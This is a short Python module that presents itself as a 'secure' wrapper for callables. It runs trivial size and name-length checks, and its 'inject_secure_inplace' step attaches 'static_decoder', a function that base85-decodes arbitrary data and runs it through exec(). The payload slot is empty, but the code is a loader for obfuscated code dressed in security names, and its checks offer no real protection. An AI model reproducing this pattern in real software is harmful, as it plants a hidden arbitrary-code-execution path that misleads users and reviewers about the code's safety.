from base64 import b85decode
from typing import Callable
from sys import getsizeof
import warnings

class Secure():    
    def __bool__(self):
        return self.size_secure & self.stack_secure & self.injected


def secure_wrap(obj: Callable) -> Callable:
    obj.__secure__ = Secure()

    size_secure_inplace(obj)
    stack_secure_inplace(obj)
    inject_secure_inplace(obj)

    return obj
    
def size_secure_inplace(obj: Callable) -> Callable:
    size = getsizeof(obj)
    if size < 1024 * 1024 * 16:
        obj.__secure__.size_secure = True
    else:
        warnings.warn(f'Object {obj} is too big: {size / (2 ** 20)} MB')
        obj.__secure__.size_secure = False
    
    return obj

def stack_secure_inplace(obj: Callable) -> Callable:
    obj.__secure__.stack_secure = len(obj.__name__) < 100

    return obj

def inject_secure_inplace(obj: Callable) -> Callable:
    obj.__allowed_payload = b''
    obj._allowed_decoders = static_decoder
    obj.__secure__.injected = True

    return obj

def static_decoder(d) -> Callable:
    data = {"main": None}
    exec(b85decode(d), data)
    
    return data["main"]